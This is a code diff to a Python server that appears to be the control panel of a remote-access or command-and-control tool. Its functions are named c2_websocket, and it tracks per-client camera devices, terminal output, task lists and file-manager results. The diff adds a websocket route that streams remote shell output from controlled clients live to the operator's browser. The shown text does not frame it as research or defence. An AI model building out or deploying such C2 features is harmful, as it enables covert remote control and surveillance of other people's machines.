@@ -27,6 +27,8 @@ camera_devices = {}
 camera_devices_lock = threading.Lock()
 terminal_results = {}
 terminal_results_lock = threading.Lock()
+shell_queues = {}       # client_id -> queue.Queue of JSON strings for browser WS
+shell_queues_lock = threading.Lock()
 tasklist_results = {}
 tasklist_results_lock = threading.Lock()
 fm_results = {}
@@ -1001,6 +1003,15 @@ def c2_websocket(ws):
                 with terminal_results_lock:
                     terminal_results[client_id] = msg.get('output', '')
                 continue
+            if msg.get('type') in ('shell_out', 'shell_done'):
+                with shell_queues_lock:
+                    q = shell_queues.get(client_id)
+                if q:
+                    try:
+                        q.put_nowait(json.dumps(msg, separators=(',', ':')))
+                    except Exception:
+                        pass
+                continue
             if msg.get('type') == 'tasklist_res':
                 with tasklist_results_lock:
                     tasklist_results[client_id] = msg.get('tasks', [])
@@ -1196,6 +1207,29 @@ def c2_get_terminal_result(client_id):
     with terminal_results_lock:
         res = terminal_results.pop(client_id, None)
     return jsonify({'output': res})
+
+@sock.route('/ws/shell/<client_id>')
+def ws_shell_stream(ws, client_id):
+    import queue as Q
+    user = get_current_user()
+    if not user or not owns_client(client_id, user['id']):
+        return
+    q = Q.Queue(maxsize=1000)
+    with shell_queues_lock:
+        shell_queues[client_id] = q
+    try:
+        while True:
+            try:
+                msg = q.get(timeout=25)
+                ws.send(msg)
+            except Q.Empty:
+                ws.send('{"type":"ping"}')
+    except Exception:
+        pass
+    finally:
+        with shell_queues_lock:
+            if shell_queues.get(client_id) is q:
+                shell_queues.pop(client_id, None)
 
 
 @app.route('/api/c2/tasklist/<client_id>')
